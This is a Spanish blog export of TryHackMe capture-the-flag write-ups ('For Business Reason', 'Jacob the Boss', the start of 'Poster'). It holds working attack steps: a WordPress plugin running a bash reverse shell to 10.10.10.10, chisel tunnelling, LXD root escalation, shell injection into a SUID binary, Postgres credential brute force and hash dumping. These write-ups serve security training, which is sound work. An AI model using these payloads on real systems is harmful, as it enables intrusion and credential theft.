http://10.10.141.160/sample-page =\u0026gt; http://10.10.141.160/sample-page/ GET 403 Forbidden http://10.10.141.160/server-status GET 301 Moved Permanently http://10.10.141.160/wp-admin =\u0026gt; http://10.10.141.160/wp-admin/ GET 200 OK http://10.10.141.160/wp-config.php GET 301 Moved Permanently http://10.10.141.160/wp-content =\u0026gt; http://10.10.141.160/wp-content/ GET 301 Moved Permanently http://10.10.141.160/wp-feed.php =\u0026gt; http:/feed/ GET 301 Moved Permanently http://10.10.141.160/wp-includes =\u0026gt; http://10.10.141.160/wp-includes/ GET 200 OK http://10.10.141.160/wp-login.php GET 301 Moved Permanently http://10.10.141.160/wp-register.php =\u0026gt; http:/wp-login.php?action=register GET 301 Moved Permanently http://10.10.141.160/wp-rss2.php =\u0026gt; http:/feed/ GET 405 Method Not Allowed http://10.10.141.160/xmlrpc.php Encontramos en el archivo robots.txt la direccion del panel de wordpress, tambien vemos una nota donde hablan sobre wordpress en un contenedor de docker.\nrobots.txt\rnote.txt\r1 2 3 User-agent: * Disallow: /wp-admin/ Allow: /wp-admin/admin-ajax.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from ticket 2915 cio wants to save money- asked us to move the wordpress site off the hosted. I setup the same versions in the docker container with teh startup script. POC complete will wait on cio\u0026#39;s office to test and see if acceptable -BWJ Ticket 3313 software audit found this version downlevel, added script to make sure its latest -RLB Ticket 3622 Quarterly password change completed -BWJ Ticket 4119 Quarterly password change completed -BWJ Ticket 4322 Auto update broke site, got a page. Disabled updates for now. emailed Rick Bligh to warn him. Emailed Bill Johnson to ask him to follow up with CIO\u0026#39;s office and get this tested. Going back to bed. -RLP Ticket 4325 Updates fixed, reeneabled. RLB isn\u0026#39;t here anymore. Talk to the CIO not me. -BWJ WPSCAN Utilizamos wpscan para busqueda de vulnerabilidades y usuarios en la pagina de wordpress en donde encontramos un usuario: sysadmin y la version de wordpress. Con el usuario ejecutamos un ataque de fuerza bruta junto al wordlist rockyou.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 [+] WordPress version 5.4.2 identified (Latest, released on 2020-06-10). | Found By: Emoji Settings (Passive Detection) | - http://bussines.thm/, Match: \u0026#39;wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.4.2\u0026#39; | Confirmed By: Meta Generator (Passive Detection) | - http://bussines.thm/, Match: \u0026#39;WordPress 5.4.2\u0026#39; [i] The main theme could not be detected. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:01 \u0026lt;===============================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:01 [i] User(s) Identified: [+] sysadmin | Found By: Wp Json Api (Aggressive Detection) | - http://bussines.thm/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Confirmed By: | Rss Generator (Aggressive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) WWW-DATA Utilizamos las credenciales que encontramos en wpscan para ingresar a wordpress, en donde vemos que el usuario sysadmin es administrador. Para obtener una shell creamos un \u0026ldquo;plugin\u0026rdquo; el cual se ejecuta cuando este es activado o desactivado en el panel de Plugins. Para la creacion de nuestro plugin utilizamos el siguiente archivo php el cual comprimimos con zip.\nUsuario Administrador\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php /** * Plugin Name: Reverse Shell Plugin * Plugin URI: * Description: Reverse Shell Plugin * Version: 1.0 * Author: Vince Matteo * Author URI: http://www.sevenlayers.com */ exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/8080 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); ?\u0026gt; 1 zip super-duper-plugin.zip shell.php Una vez creado nuestro archivo zip ponemos a la escucha netcat en el puerto indicado en nuestra shell e instalamos el plugin en el panel de plugins. Luego de activar el plugin logramos obtener una shell con usuario www-data y nuestra flag flag0.txt.\nInstalacion de Plugin\nDOCKER \u0026amp; CHISEL En la maquina no logramos encontrar algun tipo de binario, archivo, cron o usuario que nos ayude a escalar privilegios ya que el lugar donde nos encontramos es un contenedor de docker. Lo mencionaron en el archivo notes.txt, para comprobar esto es posible ver el directorio / donde comunmente se encuentra el archivo .dockerenv, además de ello en la carpeta de wordpress (/var/www/html) encontramos un archivo de docker que contiene la configuracion para que wordpress se ejecute en un contenedor, tambien encontramos que muchos de los comandos que comunmente se encuentran en una maquina en linux no existen.\nDocker\nCon todo esto lo unico que nos queda es analizar las IPs de alguna otra maquina, pero recordemos, la maquina tiene el puerto ssh (22) ¿cerrado?. Utilizando curl descargamos netcat para poder realizar un escaneo de puertos a nuestra IP e IPs.\n1 2 3 4 5 #Local Machine python3 -m http.server 80 #Bussines Machine as WWW-DATA curl 10.10.10.10/nc -o nc Ejecutamos hostname -I para conocer nuestra IP ya que net-tools no esta instalado en el contenedor, realizamos un escaneo de puertos y un test de conexion al puerto 22 con la IP o IPs encontradas con los siguientes comandos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #IP address www-data@803690c13932:/tmp/tmp$ hostname -I hostname -I 10.255.0.4 172.18.0.4 10.0.0.5 #port 22 - scan www-data@803690c13932:/tmp/tmp$ for i in {1..25}; do ./nc -v -n -z -w 1 172.18.0.$i 22; done \u0026lt;{1..25}; do ./nc -v -n -z -w 1 172.18.0.$i 22; done (UNKNOWN) [172.18.0.1] 22 (?) open (UNKNOWN) [172.18.0.2] 22 (?) : Connection timed out (UNKNOWN) [172.18.0.3] 22 (?) : Connection timed out (UNKNOWN) [172.18.0.4] 22 (?) : Connection refused [... REDACTED ...] #Test - port 22 www-data@803690c13932:/tmp/tmp$ ./nc 172.18.0.1 22 ./nc 172.18.0.1 22 SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1 Protocol mismatch. Vemos que el puerto 22 esta a la escucha, pero al parecer solo esta localmente (127.0.0.1:22). Para poder realizar una enumeracion a este puerto es necesario exponerlo o traerlo localmente a nuestra maquina, para ello utilizamos Chisel, 0xdf explica un poco acerca de esta herramienta. Basicamente lo que vamos a realizar es, obtener el puerto 22 de la maquina bussines.thm a un puerto local de nuestra maquina con los siguientes comandos:\n1 2 3 4 5 6 7 #Local - Kali #chisel server -p \u0026lt;PORT\u0026gt; --reverse kali@kali:~/thm/bussiness$ ./chisel server -p 8181 --reverse 2020/09/19 22:33:43 server: Reverse tunnelling enabled 2020/09/19 22:33:43 server: Fingerprint f6:e0:73:5b:cb:b3:0f:1f:da:8f:9b:93:81:af:7a:ab 2020/09/19 22:33:43 server: Listening on http://0.0.0.0:8181 2020/09/19 22:33:46 server: session#1: tun: proxy#R:2222=\u0026gt;172.18.0.1:22: Listening Y en la maquina (bussines.thm) descargamos y tambien ejecutamos chisel:\n1 2 3 4 5 6 7 #bussines.thm #chisel client \u0026lt;SERVER-IP\u0026gt;:\u0026lt;SERVER-PORT\u0026gt; R:\u0026lt;LOCAL-PORT-DEST\u0026gt;:\u0026lt;IP-TO-REVERSE\u0026gt;:\u0026lt;PORT-TO-REVERSE\u0026gt; www-data@803690c13932:/tmp/tmp$ ./chisel client 10.10.10.10:8181 R:2222:172.18.0.1:22 \u0026lt;chisel client 10.2.29.162:8181 R:2222:172.18.0.1:22 2020/09/20 02:33:25 client: Connecting to ws://10.10.10.10:8181 2020/09/20 02:33:45 client: Fingerprint f6:e0:73:5b:cb:b3:0f:1f:da:8f:9b:93:81:af:7a:ab 2020/09/20 02:33:46 client: Connected (Latency 302.520711ms) Ahora podemos verificar que el puerto 22 de la IP 172.18.0.1 este localmente en el puerto 2222 de nuestro localhost:\n1 2 3 4 5 6 7 kali@kali:~/thm/bussiness$ netstat -ntpl Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 12764/python3 tcp6 0 0 :::2222 :::* LISTEN 12882/./chisel \u0026lt;\u0026lt;\u0026lt;------- tcp6 0 0 :::8181 :::* LISTEN 12882/./chisel kali@kali:~/thm/bussiness$ SYSADMIN - USER Reutilizando las credenciales del usuario sysadmin ingresamos al servicio SSH de la maquina bussines.thm mediante el puerto local 2222. Logrando obtener una shell con este usuario y nuestra flag flag1.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con id y vemos que el usuario pertenece al grupo de lxd.\n1 2 sysadmin@ubuntu:~$ id uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),122(docker) Ya que este usuario pertenece a este grupo (lxd) vamos a escalar privilegios a traves de este al igual que en la maquina de THM - GamingServer.\n1 2 3 4 5 6 7 8 9 10 11 12 13 #LOCAL git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder ./build-alpine -a i686 #BUSSINES.THM MACHINE lxc image import ./alpine-v3.12-i686-20200831_2152.tar.gz --alias myimage lxc image list lxc init myimage sckull -c security.privileged=true lxc config device add sckull mydevice disk source=/ path=/mnt/root recursive=true lxc start sckull lxc exec sckull /bin/sh Logramos obtener una shell con usuario root y nuestra ultima flag flag2.txt.\n","description":"For Business Reason es una maquina de TryHackMe, realizamos un ataque de contraseñas al login de WordPress para luego instalar un Plugin y obtener una shell. Nos encontramos en un contenedor de Docker donde realizamos un escaneo de la red para luego ejecutar un Tunnel con Chisel y obtener el puerto SSH que nos permitio ingresar reutilizando credenciales. Finalmente escalamos privilegios creando un nuevo contenedor con LXC.","id":94,"section":"posts","tags":["docker","chisel","wpscan","lxc"],"title":"TryHackMe - For Business Reason","uri":"https://sckull.github.io/posts/forbusinesreason/"},{"content":"\rJacob the Boss es una maquina de TryHackMe, la version de JBossWS es vulnerable por lo que utilizamos JexBoss Tool para ejecutar una shell inversa. Finalmente escalamos privilegios con un fichero SUID.\nRoom Titulo Jacob the Boss Descripción Find a way in and learn a little more. Puntos 160 Dificultad Media Maker waldir NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22), http (80), mysql (3306), apache tomcat (8080) y el servicio jboss (8083) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 # Nmap 7.80 scan initiated Tue Sep 8 17:24:17 2020 as: nmap -sV -o mini_scan jacobtheboss.box Nmap scan report for jacobtheboss.box (10.10.186.254) Host is up (0.28s latency). Not shown: 987 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/7.3.20) 111/tcp open rpcbind 1090/tcp open java-rmi Java RMI 1098/tcp open java-rmi Java RMI 1099/tcp open java-object Java Object Serialization 3306/tcp open mysql MariaDB (unauthorized) 4444/tcp open krb524? 4445/tcp open java-object Java Object Serialization 4446/tcp open java-object Java Object Serialization 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 8083/tcp open http JBoss service httpd 3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port1099-TCP:V=7.80%I=7%D=9/8%Time=5F57F69E%P=x86_64-pc-linux-gnu%r(NUL SF:L,16F,\u0026#34;\\xac\\xed\\0\\x05sr\\0\\x19java\\.rmi\\.MarshalledObject\\|\\xbd\\x1e\\x97\\ SF:xedc\\xfc\u0026gt;\\x02\\0\\x03I\\0\\x04hash\\[\\0\\x08locBytest\\0\\x02\\[B\\[\\0\\x08objByte SF:sq\\0~\\0\\x01xp\\]3S\\xc2ur\\0\\x02\\[B\\xac\\xf3\\x17\\xf8\\x06\\x08T\\xe0\\x02\\0\\0xp SF:\\0\\0\\0\\.\\xac\\xed\\0\\x05t\\0\\x1dhttp://jacobtheboss\\.box:8083/q\\0~\\0\\0q\\0~ SF:\\0\\0uq\\0~\\0\\x03\\0\\0\\0\\xc7\\xac\\xed\\0\\x05sr\\0\\x20org\\.jnp\\.server\\.Naming SF:Server_Stub\\0\\0\\0\\0\\0\\0\\0\\x02\\x02\\0\\0xr\\0\\x1ajava\\.rmi\\.server\\.RemoteS SF:tub\\xe9\\xfe\\xdc\\xc9\\x8b\\xe1e\\x1a\\x02\\0\\0xr\\0\\x1cjava\\.rmi\\.server\\.Remo SF:teObject\\xd3a\\xb4\\x91\\x0ca3\\x1e\\x03\\0\\0xpw;\\0\\x0bUnicastRef2\\0\\0\\x10jac SF:obtheboss\\.box\\0\\0\\x04J\\0\\0\\0\\0\\0\\0\\0\\0\\xd7\\xc7\\x1c\\xd8\\0\\0\\x01to\\x99\\x SF:ed;\\x80\\0\\0x\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port4445-TCP:V=7.80%I=7%D=9/8%Time=5F57F6A3%P=x86_64-pc-linux-gnu%r(NUL SF:L,4,\u0026#34;\\xac\\xed\\0\\x05\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port4446-TCP:V=7.80%I=7%D=9/8%Time=5F57F6A3%P=x86_64-pc-linux-gnu%r(NUL SF:L,4,\u0026#34;\\xac\\xed\\0\\x05\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Sep 8 17:25:12 2020 -- 1 IP address (1 host up) scanned in 54.24 seconds HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 kali@kali:~/thm/jacobtheboss$ gobuster dir -u http://jacobtheboss.box/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /admin (Status: 301) /cache (Status: 403) /cgi-bin/ (Status: 403) /cgi-bin/.html (Status: 403) /db (Status: 403) /inc (Status: 403) /index.php (Status: 200) /index.php (Status: 200) /LICENSE (Status: 200) /plugins (Status: 403) /public (Status: 301) /themes (Status: 301) /var (Status: 403) RPCBIND RCP solo nos muestra que la conexion ha sido rechazada sin las credenciales.\n1 2 kali@kali:~/thm/jacobtheboss$ rpcclient -U \u0026#39;\u0026#39; -N jacobtheboss.box Cannot connect to server. Error was NT_STATUS_CONNECTION_REFUSED HTTP 8080 Encontramos JBoss en el puerto 8080.\nVerificamos la version de la plataforma en /jbossws/.\nJACOB - USER JBoss - JexBoss Tool Utilizamos Jexbooss para verificar si es vulnerable a los diferentes vectores. Vemos que es vulnerable a 3 de los 8 disponibles en esta herramienta.\nUtilizamos la misma herramienta para ejecutar una shell inversa al igual que en THM - Tony The Tiger.\nLogramos obtener una shell con el usuario jacob y la flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion en busqueda de archivos SUID y vemos varios comandos/binarios, a un principio se veia prometedor crontab pero al ejecutar crontab -e lo cual nos permitiria crear un cron como usuario root no era suficiente la shell que teniamos. Vemos tambien pingsys el cual realiza un ping a una determinada IP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 [jacob@jacobtheboss /]$ find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah -rwsr-xr-x. 1 root root 73K Aug 9 2019 /usr/bin/chage -rws--x--x. 1 root root 24K Apr 1 04:51 /usr/bin/chfn -rws--x--x. 1 root root 24K Apr 1 04:51 /usr/bin/chsh -rwsr-xr-x. 1 root root 57K Aug 8 2019 /usr/bin/crontab -rwsr-xr-x. 1 root root 32K Oct 30 2018 /usr/bin/fusermount -rwsr-xr-x. 1 root root 77K Aug 9 2019 /usr/bin/gpasswd -rwsr-xr-x. 1 root root 44K Apr 1 04:51 /usr/bin/mount -rwsr-xr-x. 1 root root 41K Aug 9 2019 /usr/bin/newgrp -rwsr-xr-x. 1 root root 28K Apr 1 03:57 /usr/bin/passwd -rwsr-xr-x. 1 root root 8.4K Jul 30 22:10 /usr/bin/pingsys -rwsr-xr-x. 1 root root 24K Apr 1 04:07 /usr/bin/pkexec -rwsr-xr-x. 1 root root 32K Apr 1 04:51 /usr/bin/su ---s--x--x. 1 root root 144K Apr 1 04:37 /usr/bin/sudo -rwsr-xr-x. 1 root root 32K Apr 1 04:51 /usr/bin/umount -rwsr-x---. 1 root dbus 57K Jul 13 14:23 /usr/libexec/dbus-1/dbus-daemon-launch-helper -rwsr-xr-x. 1 root root 16K Apr 1 04:07 /usr/lib/polkit-1/polkit-agent-helper-1 -rwsr-xr-x. 1 root root 115K Apr 1 03:55 /usr/sbin/mount.nfs -rwsr-xr-x. 1 root root 11K Apr 1 04:00 /usr/sbin/pam_timestamp_check -rwsr-xr-x. 1 root root 36K Apr 1 04:00 /usr/sbin/unix_chkpwd -rwsr-xr-x. 1 root root 12K Apr 1 02:50 /usr/sbin/usernetctl Despues de investigar un poco sobre pingsys encontramos un post en donde habla acerca de este binario, el codigo fuente y de cómo es posible obtener una shell con privilegios root. El Binario que encontramos en la maquina tiene strings muy parecidas al del codigo del post.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 [jacob@jacobtheboss /]$ file /usr/bin/pingsys /usr/bin/pingsys: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=6edc93ec3e4b82857772727e602265140ee00823, not stripped [jacob@jacobtheboss /]$ strings /usr/bin/pingsys /lib64/ld-linux-x86-64.so.2 wrr~`\u0026#34;e libc.so.6 setuid system __libc_start_main snprintf __gmon_start__ GLIBC_2.2.5 UH-P UH-P []A\\A]A^A_ ping -c 4 %s setUID ERROR ;*3$\u0026#34; [... REDACTED ...] [root@jacobtheboss .ssh]# Utilizamos pingsys pasandole una IP y /bin/sh separados por ; lo cual va a realizar ping sobre la IP y luego ejecutará /bin/sh, logramos obtener una shell con usuario root y la flag root.txt.\n1 /usr/bin/pingsys \u0026#39;127.0.0.1; /bin/sh\u0026#39; ","description":"Jacob the Boss es una maquina de TryHackMe, la version de JBossWS es vulnerable por lo que utilizamos JexBoss Tool para ejecutar una shell inversa. Finalmente escalamos privilegios con un fichero SUID.","id":95,"section":"posts","tags":["jboss","jexboss tool","suid"],"title":"TryHackMe - Jacob the Boss","uri":"https://sckull.github.io/posts/jacobtheboss/"},{"content":"\rPoster es una maquina de TryHackMe, esta enfocada en PostgreSQL medio por el cual se obtuvieron credenciales para acceder por SSH. Credenciales almacenadas nos dieron acceso al siguiente usuario. Escalamos privilegios utilizando Sudo.\nRoom Titulo Poster Descripción The sys admin set up a rdbms in a safe way. Puntos 760 Dificultad Facil Maker stuxnet NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto postgresql (5432) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # Nmap 7.80 scan initiated Fri Sep 11 23:46:50 2020 as: nmap -Pn -p- --min-rate=1000 -o allports poster.thm Warning: 10.10.111.10 giving up on port because retransmission cap hit (10). Nmap scan report for poster.thm (10.10.111.10) Host is up (0.26s latency). Not shown: 63651 closed ports, 1882 filtered ports PORT STATE SERVICE 80/tcp open http 5432/tcp open postgresql # Nmap done at Fri Sep 11 23:49:38 2020 -- 1 IP address (1 host up) scanned in 168.04 seconds # Nmap 7.80 scan initiated Fri Sep 11 23:51:06 2020 as: nmap -Pn -sV -sC -p80,5432 -o servicePorts poster.thm Nmap scan report for poster.thm (10.10.111.10) Host is up (0.34s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Poster CMS 5432/tcp open postgresql PostgreSQL DB 9.5.8 - 9.5.10 | ssl-cert: Subject: commonName=ubuntu | Not valid before: 2020-07-29T00:54:25 |_Not valid after: 2030-07-27T00:54:25 |_ssl-date: TLS randomness does not represent time Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Sep 11 23:51:23 2020 -- 1 IP address (1 host up) scanned in 16.70 seconds HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 kali@kali:~/thm/poster$ gobuster dir -u http://poster.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /assets (Status: 301) /images (Status: 301) /index.html (Status: 200) /server-status (Status: 403) POSTGRESQL - METASPLOIT Utilizando un modulo de metasploit para la enumeracion de usuarios por default logramos encontrar unas credenciales. Hay que mencionar que el nombre de las bases de datos que postgres crea durante la instalacion son: postgres y template1, por lo que es posible utilizar uno de estos dos para realizar una enumeracion de credenciales.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 msf5 \u0026gt; search type:auxiliary postgres Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/http/manageengine_pmp_privesc 2014-11-08 normal Yes ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection 1 auxiliary/admin/http/rails_devise_pass_reset 2013-01-28 normal No Ruby on Rails Devise Authentication Password Reset 2 auxiliary/admin/postgres/postgres_readfile normal No PostgreSQL Server Generic Query 3 auxiliary/admin/postgres/postgres_sql normal No PostgreSQL Server Generic Query 4 auxiliary/analyze/crack_databases normal No Password Cracker: Databases 5 auxiliary/scanner/postgres/postgres_dbname_flag_injection normal No PostgreSQL Database Name Command Line Flag Injection 6 auxiliary/scanner/postgres/postgres_hashdump normal No Postgres Password Hashdump 7 auxiliary/scanner/postgres/postgres_login normal No PostgreSQL Login Utility 8 auxiliary/scanner/postgres/postgres_schemadump normal No Postgres Schema Dump 9 auxiliary/scanner/postgres/postgres_version normal No PostgreSQL Version Probe 10 auxiliary/server/capture/postgresql normal No Authentication Capture: PostgreSQL msf5 \u0026gt; use auxiliary/scanner/postgres/postgres_login msf5 auxiliary(scanner/postgres/postgres_login) \u0026gt; show options Module options (auxiliary/scanner/postgres/postgres_login): Name Current Setting Required Description ---- --------------- -------- ----------- BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DATABASE template1 yes The database to authenticate against DB_ALL_CREDS false no Try each user/password couple stored in the current database DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list PASSWORD no A specific password to authenticate with PASS_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt no File containing passwords, one per line Proxies no A proxy chain of format type:host:port[,type:host:port][...] RETURN_ROWSET true no Set to true to see query result sets RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port STOP_ON_SUCCESS false yes Stop guessing when a credential works for a host THREADS 1 yes The number of concurrent threads (max one per host) USERNAME no A specific username to authenticate as USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt no File containing (space-separated) users and passwords, one pair per line USER_AS_PASS false no Try the username as the password for all users USER_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt no File containing users, one per line VERBOSE true yes Whether to print output for all attempts msf5 auxiliary(scanner/postgres/postgres_login) \u0026gt; set rhosts poster.thm rhosts =\u0026gt; poster.thm msf5 auxiliary(scanner/postgres/postgres_login) \u0026gt; run [!] No active DB -- Credential data will not be saved! [-] 10.10.111.10:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password) [... REDACTED ...] [+] 10.10.111.10:5432 - Login Successful: [... REDACTED ...] [... REDACTED ...] [-] 10.10.111.10:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf5 auxiliary(scanner/postgres/postgres_login) \u0026gt; Con las credenciales encontradas podemos verificar que el usuario actual pueda realizar Querys en la base de datos template1. El query que trae por defecto el modulo es para verificar la version de postgres.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 msf5 \u0026gt; use auxiliary/admin/postgres/postgres_sql msf5 auxiliary(admin/postgres/postgres_sql) \u0026gt; show options Module options (auxiliary/admin/postgres/postgres_sql): Name Current Setting Required Description ---- --------------- -------- ----------- DATABASE template1 yes The database to authenticate against PASSWORD postgres no The password for the specified username. Leave blank for a random password. RETURN_ROWSET true no Set to true to see query result sets RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port SQL select version() no The SQL query to execute USERNAME postgres yes The username to authenticate as VERBOSE false no Enable verbose output msf5 auxiliary(admin/postgres/postgres_sql) \u0026gt; set RHOSTS poster.thm RHOSTS =\u0026gt; poster.thm msf5 auxiliary(admin/postgres/postgres_sql) \u0026gt; set PASSWORD [... REDACTED ...] PASSWORD =\u0026gt; [... REDACTED ...] msf5 auxiliary(admin/postgres/postgres_sql) \u0026gt; show options Module options (auxiliary/admin/postgres/postgres_sql): Name Current Setting Required Description ---- --------------- -------- ----------- DATABASE template1 yes The database to authenticate against PASSWORD [... REDACTED ...] no The password for the specified username. Leave blank for a random password. RETURN_ROWSET true no Set to true to see query result sets RHOSTS poster.thm yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port SQL select version() no The SQL query to execute USERNAME postgres yes The username to authenticate as VERBOSE false no Enable verbose output msf5 auxiliary(admin/postgres/postgres_sql) \u0026gt; run [*] Running module against 10.10.111.10 Query Text: \u0026#39;select version()\u0026#39; =============================== version ------- PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit [*] Auxiliary module execution completed msf5 auxiliary(admin/postgres/postgres_sql) \u0026gt; Ahora que sabemos que podemos realizar querys en la base de datos, vamos a probar si es posible obtener los hashes de los usuarios con un modulo de metasploit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 msf5 auxiliary(admin/postgres/postgres_sql) \u0026gt; use auxiliary/scanner/postgres/postgres_hashdump msf5 auxiliary(scanner/postgres/postgres_hashdump) \u0026gt; show options Module options (auxiliary/scanner/postgres/postgres_hashdump): Name Current Setting Required Description ---- --------------- -------- ----------- DATABASE postgres yes The database to authenticate against PASSWORD postgres no The password for the specified username. Leave blank for a random password. RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port THREADS 1 yes The number of concurrent threads (max one per host) USERNAME postgres yes The username to authenticate as msf5 auxiliary(scanner/postgres/postgres_hashdump) \u0026gt; set PASSWORD [... REDACTED ...] PASSWORD =\u0026gt; [... REDACTED ...] msf5 auxiliary(scanner/postgres/postgres_hashdump) \u0026gt; set rhosts poster.thm rhosts =\u0026gt; poster.thm msf5 auxiliary(scanner/postgres/postgres_hashdump) \u0026gt; show options Module options (auxiliary/scanner/postgres/postgres_hashdump): Name Current Setting Required Description ---- --------------- -------- ----------- DATABASE postgres yes The database to authenticate against PASSWORD [... REDACTED ...] no The password for the specified username. Leave blank for a random password. RHOSTS poster.thm yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port THREADS 1 yes The number of concurrent threads (max one per host) USERNAME postgres yes The username to authenticate as msf5 auxiliary(scanner/postgres/postgres_hashdump) \u0026gt; run [+] Query appears to have run successfully [+] Postgres Server Hashes ====================== Username Hash -------- ---- darkstart md58842b99375db43e9fdf238753623a27d poster md578fb805c7412ae597b399844a54cce0a postgres md532e12f215ba27cb750c9e093ce4b5127 sistemas md5f7dbc0d5a06653e74da6b1af9290ee2b ti md57af9ac4c593e9e4f275576e13f935579 tryhackme md503aab1165001c8f8ccae31a8824efddc [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf5 auxiliary(scanner/postgres/postgres_hashdump) \u0026gt; Tambien es posible realizar una lectura de archivos dentro del servidor utilizando otro modulo de metasploit. Al realizar la lectura del archivo /etc/passwd vemos la lista de usuarios dentro del servidor, además de eso tambien vemos una direccion de un archivo de texto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 msf5 auxiliary(scanner/postgres/postgres_hashdump) \u0026gt; use auxiliary/admin/postgres/postgres_readfile msf5 auxiliary(admin/postgres/postgres_readfile) \u0026gt; show options Module options (auxiliary/admin/postgres/postgres_readfile): Name Current Setting Required Description ---- --------------- -------- ----------- DATABASE template1 yes The database to authenticate against PASSWORD postgres no The password for the specified username. Leave blank for a random password. RFILE /etc/passwd yes The remote file RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; 